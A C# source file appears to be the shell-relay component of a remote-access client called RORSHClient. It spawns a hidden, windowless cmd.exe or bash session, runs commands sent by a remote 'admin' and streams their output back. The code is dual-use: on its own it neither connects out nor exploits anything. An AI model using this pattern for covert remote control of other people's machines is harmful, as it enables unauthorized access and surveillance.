using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RORSHClient
{
    /// <summary>
    /// Shell relay for executing commands received from admin
    /// Spawns a hidden shell process and streams output back
    /// </summary>
    public class ShellRelay
    {
        private Process _shellProcess;
        private StreamWriter _inputWriter;
        private StreamReader _outputReader;
        private StreamReader _errorReader;
        private CancellationTokenSource _cts;
        private Task _outputTask;
        private Task _errorTask;
        private bool _isRunning = false;
        private readonly object _lock = new object();

        public event EventHandler<string> OnOutput;

        /// <summary>
        /// Start a new shell process (hidden, no window)
        /// </summary>
        public void StartShell()
        {
            lock (_lock)
            {
                if (_isRunning) return;

                try
                {
                    _cts = new CancellationTokenSource();

                    var psi = new ProcessStartInfo();

                    if (OperatingSystem.IsWindows())
                    {
                        psi.FileName = "cmd.exe";
                        psi.Arguments = "/K";
                    }
                    else
                    {
                        psi.FileName = "/bin/bash";
                        psi.Arguments = "-i";
                    }

                    psi.UseShellExecute = false;
                    psi.RedirectStandardInput = true;
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardError = true;
                    psi.CreateNoWindow = true;
                    psi.WindowStyle = ProcessWindowStyle.Hidden;
                    psi.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                    _shellProcess = new Process();
                    _shellProcess.StartInfo = psi;
                    _shellProcess.Start();

                    _inputWriter = _shellProcess.StandardInput;
                    _outputReader = _shellProcess.StandardOutput;
                    _errorReader = _shellProcess.StandardError;

                    _isRunning = true;

                    // Start reading output streams
                    _outputTask = Task.Run(ReadOutput);
                    _errorTask = Task.Run(ReadError);

                    Console.WriteLine("[Shell] Shell process started");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Shell] Failed to start shell: {ex.Message}");
                    OnOutput?.Invoke(this, $"ERROR: Failed to start shell: {ex.Message}\n");
                }
            }
        }

        /// <summary>
        /// Execute a command in the shell
        /// </summary>
        public void ExecuteCommand(string command)
        {
            lock (_lock)
            {
                if (!_isRunning || _inputWriter == null)
                {
                    OnOutput?.Invoke(this, "ERROR: Shell not running\n");
                    return;
                }

                try
                {
                    _inputWriter.WriteLine(command);
                    _inputWriter.Flush();
                    Console.WriteLine($"[Shell] Command executed: {command}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Shell] Command execution error: {ex.Message}");
                    OnOutput?.Invoke(this, $"ERROR: {ex.Message}\n");
                }
            }
        }

        /// <summary>
        /// Resize the shell (for terminal emulation)
        /// </summary>
        public void Resize(int cols, int rows)
        {
            // Terminal resize is OS-specific and complex
            // For basic implementation, we log it
            Console.WriteLine($"[Shell] Resize requested: {cols}x{rows}");
        }

        /// <summary>
        /// Stop the shell process
        /// </summary>
        public void StopShell()
        {
            lock (_lock)
            {
                if (!_isRunning) return;

                try
                {
                    _cts?.Cancel();

                    if (_inputWriter != null)
                    {
                        _inputWriter.Close();
                        _inputWriter = null;
                    }

                    if (_shellProcess != null && !_shellProcess.HasExited)
                    {
                        _shellProcess.Kill();
                        _shellProcess.WaitForExit(2000);
                        _shellProcess.Dispose();
                        _shellProcess = null;
                    }

                    _isRunning = false;
                    Console.WriteLine("[Shell] Shell process stopped");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Shell] Stop error: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Read stdout from shell
        /// </summary>
        private async Task ReadOutput()
        {
            try
            {
                var buffer = new char[1024];
                while (!_cts.Token.IsCancellationRequested && _outputReader != null)
                {
                    var read = await _outputReader.ReadAsync(buffer, 0, buffer.Length);
                    if (read > 0)
                    {
                        var output = new string(buffer, 0, read);
                        OnOutput?.Invoke(this, output);
                    }
                    else
                    {
                        await Task.Delay(50);
                    }
                }
            }
            catch (Exception ex) when (ex is OperationCanceledException || ex is ObjectDisposedException)
            {
                // Expected on shutdown
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Shell] Output read error: {ex.Message}");
            }
        }

        /// <summary>
        /// Read stderr from shell
        /// </summary>
        private async Task ReadError()
        {
            try
            {
                var buffer = new char[1024];
                while (!_cts.Token.IsCancellationRequested && _errorReader != null)
                {
                    var read = await _errorReader.ReadAsync(buffer, 0, buffer.Length);
                    if (read > 0)
                    {
                        var error = new string(buffer, 0, read);
                        OnOutput?.Invoke(this, $"[stderr] {error}");
                    }
                    else
                    {
                        await Task.Delay(50);
                    }
                }
            }
            catch (Exception ex) when (ex is OperationCanceledException || ex is ObjectDisposedException)
            {
                // Expected on shutdown
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Shell] Error read error: {ex.Message}");
            }
        }

        /// <summary>
        /// Check if shell is running
        /// </summary>
        public bool IsRunning => _isRunning;
    }
}
